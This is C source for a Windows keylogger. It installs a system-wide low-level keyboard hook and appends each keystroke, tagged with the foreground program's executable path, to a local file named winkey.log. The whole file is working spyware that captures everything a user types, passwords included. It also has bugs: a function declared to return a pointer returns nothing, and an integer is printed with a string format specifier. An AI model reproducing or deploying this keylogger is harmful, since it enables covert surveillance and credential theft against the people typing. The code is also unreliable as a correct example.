#include "../winkey.h"

HHOOK g_ouk;

void *which_open(char *exe)
{
	HWND ptr_stuct = GetForegroundWindow();
	DWORD pid = 0;
	GetWindowThreadProcessId(ptr_stuct, &pid);
	HANDLE hd = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	if (hd)
	{
		GetModuleFileNameExA(hd, NULL,exe, MAX_PATH);
		CloseHandle(hd);
	}
}


LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
{
	char exe[MAX_PATH] = {0};
	char key[8] = {0};
	if (ncode == HC_ACTION && wp == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lp;
		int new_key = vk_to_char(kbd->vkCode, key);
		which_open(exe);
		FILE *f = fopen("winkey.log", "a");
		if (f)
		{
			if (new_key)
				fprintf(f, "[%s] key: '%s'\n", exe, new_key);
			else
				fprintf(f, "[%s] key: VK(%lu)\n", exe, kbd->vkCode);
			fclose(f);
		}
	}
	return (CallNextHookEx(g_ouk, ncode, wp, lp));
}



int main(void)
{
	g_ouk = SetWindowsHookEx(WH_KEYBOARD_LL, callback_clavier, NULL, 0);
	MSG msg;
	if (!g_ouk)
	{
		printf("Error: can't install the hook.\n");
		return 1;
	}
	printf("winkey: hook install ;)");
	while(GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(g_ouk);
	return (0);
}